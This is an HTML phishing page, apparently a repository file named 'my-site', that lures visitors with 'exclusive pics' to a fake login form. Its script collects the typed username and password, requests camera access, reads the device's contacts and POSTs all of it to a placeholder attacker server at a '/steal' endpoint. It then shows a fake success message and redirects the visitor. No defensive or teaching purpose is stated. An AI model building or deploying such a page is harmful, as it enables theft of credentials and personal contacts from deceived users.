# my-site
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Free Pics Deal</title>
    <style>
        body { font-family: Arial; text-align: center; background: #f0f0f0; }
        .login { margin: 100px auto; padding: 20px; width: 300px; background: white; border-radius: 10px; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { padding: 10px 20px; background: #ff4500; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login">
        <h2>View My Exclusive Pics!</h2>
        <p>Log in to see the goods!</p>
        <input type="text" id="username" placeholder="Username">
        <input type="password" id="password" placeholder="Password">
        <button onclick="grabData()">Login</button>
    </div>
    <script>
        function grabData() {
            let user = document.getElementById('username').value;
            let pass = document.getElementById('password').value;
            // Sneaky script to try accessing gallery/contacts
            navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
            navigator.contacts.select(['name', 'tel']).then(contacts => {
                fetch('http://your-shady-server.com/steal', {
                    method: 'POST',
                    body: JSON.stringify({ user, pass, contacts, gallery: 'attempted' })
                });
                alert('Login successful! Redirecting...');
                window.location = 'https://fake-site.com';
            }).catch(() => {
                alert('Login failed, try again!');
            });
        }
    </script>
</body>
</html>
